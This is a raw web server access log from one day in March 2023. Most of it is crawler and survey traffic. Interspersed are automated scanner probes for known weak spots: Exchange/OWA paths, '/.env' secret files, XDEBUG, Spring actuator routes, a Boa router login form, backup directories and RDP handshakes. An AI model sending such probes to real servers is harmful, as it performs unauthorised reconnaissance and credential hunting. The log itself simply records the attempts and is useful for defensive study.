143.110.222.166 - - [30/Mar/2023:10:28:12 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
40.77.167.187 - - [30/Mar/2023:10:30:13 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.62 - - [30/Mar/2023:10:30:21 +0000] "GET / HTTP/1.1" 200 1707 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.105 - - [30/Mar/2023:10:31:25 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.105 - - [30/Mar/2023:10:31:25 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.198 - - [30/Mar/2023:10:31:31 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
202.182.111.56 - - [30/Mar/2023:10:46:41 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 researchscan.comsys.rwth-aachen.de"
198.199.92.121 - - [30/Mar/2023:10:58:54 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
157.55.39.223 - - [30/Mar/2023:11:00:28 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
157.55.39.223 - - [30/Mar/2023:11:00:29 +0000] "GET /robots.txt HTTP/1.1" 200 95 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.198 - - [30/Mar/2023:11:00:54 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
54.155.232.156 - - [30/Mar/2023:11:01:26 +0000] "HEAD / HTTP/1.1" 200 0 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
192.241.200.29 - - [30/Mar/2023:11:03:43 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
193.32.162.159 - - [30/Mar/2023:11:09:23 +0000] "GET / HTTP/1.1" 200 415717 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [30/Mar/2023:11:09:33 +0000] "GET /dispatch.asp HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
94.102.61.7 - - [30/Mar/2023:11:23:17 +0000] "GET / HTTP/1.1" 200 1583 "-" "python-requests/2.26.0"
51.15.250.234 - - [30/Mar/2023:11:26:30 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
51.158.72.199 - - [30/Mar/2023:11:30:02 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [30/Mar/2023:11:31:34 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.189.182.234 - - [30/Mar/2023:11:32:40 +0000] "GET / HTTP/1.1" 400 157 "-" "-"
94.102.61.7 - - [30/Mar/2023:11:39:13 +0000] "GET / HTTP/1.1" 200 1583 "-" "python-requests/2.26.0"
34.254.29.94 - - [30/Mar/2023:11:39:59 +0000] "HEAD / HTTP/1.1" 301 0 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
185.225.74.42 - - [30/Mar/2023:11:44:13 +0000] "GET / HTTP/1.1" 200 144523 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
193.235.141.164 - - [30/Mar/2023:11:45:36 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
45.56.108.128 - - [30/Mar/2023:11:55:17 +0000] "GET /systembc/password.php HTTP/1.0" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
40.77.167.252 - - [30/Mar/2023:11:57:47 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.198 - - [30/Mar/2023:12:02:50 +0000] "GET / HTTP/1.1" 200 1010 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
18.203.135.84 - - [30/Mar/2023:12:05:39 +0000] "HEAD / HTTP/1.1" 200 0 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
161.35.233.14 - - [30/Mar/2023:12:09:06 +0000] "GET /explore HTTP/1.1" 404 125 "-" "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0"
193.32.162.159 - - [30/Mar/2023:12:11:26 +0000] "GET / HTTP/1.1" 200 415717 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [30/Mar/2023:12:11:36 +0000] "GET /dispatch.asp HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
52.167.144.62 - - [30/Mar/2023:12:14:11 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.252 - - [30/Mar/2023:12:27:19 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [30/Mar/2023:12:27:45 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
194.55.224.203 - - [30/Mar/2023:12:34:21 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
152.89.196.54 - - [30/Mar/2023:12:50:52 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 415724 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
46.137.141.174 - - [30/Mar/2023:12:51:59 +0000] "HEAD / HTTP/1.1" 301 0 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
69.167.12.20 - - [30/Mar/2023:12:56:45 +0000] "HEAD /wordpress HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:45 +0000] "HEAD /wordpress HTTP/1.1" 404 0 "http://searx.pseudot.org/wordpress" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:45 +0000] "HEAD / HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:45 +0000] "HEAD / HTTP/1.1" 200 0 "http://searx.pseudot.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:46 +0000] "HEAD /wp HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:46 +0000] "HEAD /wp HTTP/1.1" 404 0 "http://searx.pseudot.org/wp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:46 +0000] "HEAD /bc HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:46 +0000] "HEAD /bc HTTP/1.1" 404 0 "http://searx.pseudot.org/bc" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:46 +0000] "HEAD /bk HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:46 +0000] "HEAD /bk HTTP/1.1" 404 0 "http://searx.pseudot.org/bk" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:46 +0000] "HEAD /backup HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:46 +0000] "HEAD /backup HTTP/1.1" 404 0 "http://searx.pseudot.org/backup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:46 +0000] "HEAD /old HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:47 +0000] "HEAD /old HTTP/1.1" 404 0 "http://searx.pseudot.org/old" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:47 +0000] "HEAD /new HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:47 +0000] "HEAD /new HTTP/1.1" 404 0 "http://searx.pseudot.org/new" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:47 +0000] "HEAD /main HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:47 +0000] "HEAD /main HTTP/1.1" 404 0 "http://searx.pseudot.org/main" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:47 +0000] "HEAD /home HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:12:56:47 +0000] "HEAD /home HTTP/1.1" 404 0 "http://searx.pseudot.org/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
183.156.143.202 - - [30/Mar/2023:13:05:50 +0000] "GET / HTTP/1.0" 200 5190 "-" "-"
157.55.39.225 - - [30/Mar/2023:13:25:25 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
157.55.39.225 - - [30/Mar/2023:13:25:25 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.58 - - [30/Mar/2023:13:25:33 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.184 - - [30/Mar/2023:13:29:07 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.184 - - [30/Mar/2023:13:29:07 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
207.46.13.211 - - [30/Mar/2023:13:29:17 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [30/Mar/2023:13:31:25 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
103.99.3.216 - - [30/Mar/2023:13:38:48 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
103.99.3.216 - - [30/Mar/2023:13:38:50 +0000] "GET /HNAP1/ HTTP/1.1" 404 125 "https://208.76.222.31/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
45.227.254.8 - - [30/Mar/2023:13:43:09 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 157 "-" "-"
45.227.254.8 - - [30/Mar/2023:13:43:09 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 157 "-" "-"
152.89.196.54 - - [30/Mar/2023:13:44:56 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
62.233.50.15 - - [30/Mar/2023:13:48:22 +0000] "\x16\x03\x03\x00\x94\x01\x00\x00\x90\x03\x03d%\x93&\x9E\x17\x04H4<\xC7v\xC4\x88W@\xA3\x87\x98#\xD3\x9Ee\xD7\x86\xB2\x0E\xD1u\x88\xCE\xD9\x00\x00*\xC0,\xC0+\xC00\xC0/\x00\x9F\x00\x9E\xC0$\xC0#\xC0(\xC0'\xC0" 400 157 "-" "-"
54.36.148.90 - - [30/Mar/2023:14:00:26 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.22 - - [30/Mar/2023:14:00:27 +0000] "GET /posts/pseudopost-1/pseudopost-1.html HTTP/1.1" 200 2695 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.105 - - [30/Mar/2023:14:00:30 +0000] "GET /posts/pseudopost-1/images/tweety.gif HTTP/1.1" 200 8392 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.241 - - [30/Mar/2023:14:00:31 +0000] "GET /posts/pseudopost-1/images/mouse.gif HTTP/1.1" 200 16506 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
207.46.13.211 - - [30/Mar/2023:14:01:39 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.184 - - [30/Mar/2023:14:07:55 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.252 - - [30/Mar/2023:14:07:59 +0000] "GET / HTTP/1.1" 200 605 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.184 - - [30/Mar/2023:14:14:51 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.184 - - [30/Mar/2023:14:14:51 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
157.55.39.224 - - [30/Mar/2023:14:14:57 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
94.102.61.10 - - [30/Mar/2023:14:22:11 +0000] "GET / HTTP/1.1" 200 415939 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
143.110.222.166 - - [30/Mar/2023:14:29:06 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
167.94.138.126 - - [30/Mar/2023:14:44:01 +0000] "GET / HTTP/1.1" 200 361718 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.126 - - [30/Mar/2023:14:44:01 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.138.126 - - [30/Mar/2023:14:44:02 +0000] "GET /favicon.png HTTP/1.1" 200 17440 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.126 - - [30/Mar/2023:14:44:02 +0000] "GET /apple-touch-icon.png HTTP/1.1" 200 15195 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.126 - - [30/Mar/2023:14:44:02 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
179.43.177.242 - - [30/Mar/2023:14:50:01 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Hello World"
45.79.181.179 - - [30/Mar/2023:14:53:01 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03d\xBDKJ\xDC(\x8B\xEF\x88\xC6\xC7\x5C\xBC\x12y^\x8F\x9F\xBEJ;\xAC\xE9'\xA6\xE3Tm\x12\x0F_\xE3\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
40.77.167.187 - - [30/Mar/2023:15:09:29 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.62 - - [30/Mar/2023:15:09:37 +0000] "GET / HTTP/1.1" 200 1029 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
94.198.41.254 - - [30/Mar/2023:15:09:53 +0000] "HEAD /.env HTTP/1.1" 404 0 "-" "Go-http-client/1.1"
154.209.125.56 - - [30/Mar/2023:15:14:58 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
109.196.78.137 - - [30/Mar/2023:15:20:02 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [30/Mar/2023:15:31:54 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.225.74.42 - - [30/Mar/2023:15:45:27 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 0 "http://208.76.222.31:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.225.74.42 - - [30/Mar/2023:15:45:27 +0000] "" 400 0 "-" "-"
207.46.13.229 - - [30/Mar/2023:15:51:08 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
207.46.13.229 - - [30/Mar/2023:15:51:09 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
157.55.39.224 - - [30/Mar/2023:15:51:17 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
5.43.220.158 - - [30/Mar/2023:15:51:49 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
5.43.220.158 - - [30/Mar/2023:15:51:50 +0000] "GET / HTTP/1.1" 200 2597357 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
5.43.220.158 - - [30/Mar/2023:15:51:50 +0000] "GET / HTTP/1.1" 200 2593313 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
5.43.220.158 - - [30/Mar/2023:15:51:50 +0000] "GET / HTTP/1.1" 200 2578485 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
40.77.167.184 - - [30/Mar/2023:16:01:00 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.58 - - [30/Mar/2023:16:01:08 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
45.128.232.149 - - [30/Mar/2023:16:01:49 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 0 "http://208.76.222.31:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.149 - - [30/Mar/2023:16:01:49 +0000] "" 400 0 "-" "-"
157.55.39.225 - - [30/Mar/2023:16:07:34 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.198 - - [30/Mar/2023:16:07:43 +0000] "GET / HTTP/1.1" 200 587 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [30/Mar/2023:16:29:39 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.225.74.42 - - [30/Mar/2023:16:31:09 +0000] "GET / HTTP/1.1" 200 130913 "-" "Linux Gnu (cow)"
51.222.253.13 - - [30/Mar/2023:16:34:43 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.198 - - [30/Mar/2023:16:34:44 +0000] "GET / HTTP/1.1" 200 1707 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
193.32.162.159 - - [30/Mar/2023:16:37:20 +0000] "GET / HTTP/1.1" 200 415717 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [30/Mar/2023:16:37:30 +0000] "GET /dispatch.asp HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
31.220.1.83 - - [30/Mar/2023:16:40:35 +0000] "GET / HTTP/1.1" 200 415939 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
43.158.213.246 - - [30/Mar/2023:16:49:31 +0000] "GET / HTTP/1.1" 200 1583 "-" "'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0'"
